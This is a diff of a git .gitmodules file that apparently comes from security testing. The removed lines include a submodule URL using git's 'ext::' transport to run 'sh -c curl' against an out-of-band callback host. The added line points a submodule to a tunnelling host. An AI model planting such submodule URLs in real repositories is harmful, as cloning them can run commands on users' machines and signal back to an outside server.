@@ -1,6 +1,3 @@
-[submodule "sub"]
-	path = sub
-	url = http://dav38tdp8rngl104reqgk1oao6pqi8utn.oast.pro/c2sub
-[submodule "ext"]
-	path = ext
-	url = ext::sh -c curl% http://dav38tdp8rngl104reqgk1oao6pqi8utn.oast.pro/c2ext
+[submodule "i140sub"]
+	path = i140sub
+	url = https://7e4dcf2478a081.lhr.life/sub.git
